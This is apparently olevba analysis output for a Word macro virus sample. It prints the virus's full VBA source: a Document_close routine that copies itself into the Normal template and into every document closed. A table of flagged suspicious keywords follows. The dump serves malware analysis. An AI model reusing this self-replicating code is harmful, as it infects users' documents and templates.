olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Claud.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Claudio2.cls 
in file: ./Virus.MSWord.Claud.c - OLE stream: 'Macros/VBA/Claudio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
On Error Resume Next
Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
 Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
'  CommandBars("tools").Controls("macro").Enabled = False
'  Options.VirusProtection = True
  y = 0
  If AD.Name = "Claudio2" Then GoTo InfectNormal
  i = nt.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
Claudio:
  jota = 0
  jota = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < nt.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = nt.CodeModule.Lines(jota, 1)
     AD.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   AD.Name = "Claudio2"
   ActiveDocument.SaveAs ActiveDocument.FullName
  Else
    AD.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo Claudio
  End If
 GoTo IYGH
InfectNormal:
If nt.Name <> "Claudio2" Then
i = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
jota = 0
jota = nt.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < AD.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = AD.CodeModule.Lines(jota, 1)
     nt.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   nt.Name = "Claudio2"
   NormalTemplate.Save
  Else
    nt.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo InfectNormal
  End If
 End If
IYGH:
'Este es un V macro, Elaborado por c l a u d I o
'Este es el Comienzo de la era de los V Claudio
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

